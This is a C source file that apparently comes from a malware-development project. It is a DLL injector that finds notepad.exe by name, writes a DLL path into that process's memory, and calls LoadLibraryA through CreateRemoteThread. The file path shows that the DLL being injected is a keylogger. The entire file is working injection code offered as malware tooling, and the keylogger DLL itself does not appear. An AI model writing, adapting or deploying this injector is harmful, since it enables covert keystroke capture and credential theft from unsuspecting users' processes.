// find Notepad's PID using CreatetoolHelp32Snapshot
// allocate memory using VirtualAllocEx
// write DLL's path into that space memory using WriteProcessMemory
// CreateRemoteThread, LoadLibraryA

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Take RAM's snapshot to find Notepad's PID
DWORD GetProcessIdByName(const wchar_t* processName) {
	DWORD pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {

		PROCESSENTRY32W entry;
		entry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &entry)) {

			do {
				// check if the current process of the snapshot being investigated
				// is Notepad
				if (_wcsicmp(entry.szExeFile, processName) == 0) {
					pid = entry.th32ProcessID;
					break;
				}
			} while (Process32NextW(snapshot, &entry));

		}
		CloseHandle(snapshot);
	}
	return pid;
}

int main() {

	const char* dllPath = "C:\\Users\\MALDEV01\\Downloads\\Maldev Projects\\DLL Keylogger\\x64\\Debug\\DLL Keylogger.dll";
	const wchar_t* targetProcess = L"notepad.exe";

	DWORD pid = GetProcessIdByName(targetProcess);

	if (pid == 0) {
		printf("Failed. Open Notepad first!\n");
		system("pause");
		return -1;
	}
	printf("[+] Notepad is open, PID: %d\n", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		printf("Failed opening Notepad, run Injector as Admin\n");
		system("pause");
		return -1;
	}

	//allocate memory for Keylogger dll in Notepad's given memory 
	LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteCode, dllPath, strlen(dllPath) + 1, NULL);


	//find LoadLibrary's address in kernel32.dll because Notepad itself can't directly call this function
	//we have to use CreateRemoteThread to create another Thread inside Notepad's memory
	PVOID pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteCode, 0, NULL);

	if (hThread) {
		printf("SUCCESS Injection!\n");
		CloseHandle(hThread);
	}
	else
		printf("Failed. Check x86/x64\n");

	CloseHandle(hProcess);
	system("pause");

	return 0;
}